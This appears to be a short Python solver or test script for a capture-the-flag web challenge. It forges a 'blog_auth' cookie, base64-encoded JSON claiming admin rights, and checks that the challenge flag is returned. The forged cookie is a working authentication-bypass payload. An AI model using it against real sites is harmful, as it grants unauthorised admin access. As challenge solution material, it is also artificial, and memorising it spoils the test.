import requests
import argparse
import yaml
from base64 import b64encode
from pathlib import Path

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


def test(url):
    session = requests.Session()

    res = session.get(
        url,
        cookies={"blog_auth": b64encode(b'{"user":"admin","is_admin":true}').decode()},
    )
    assert FLAG in res.text, res.text


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", default="http://localhost:5000", nargs="?")
    args = parser.parse_args()

    test(args.url)
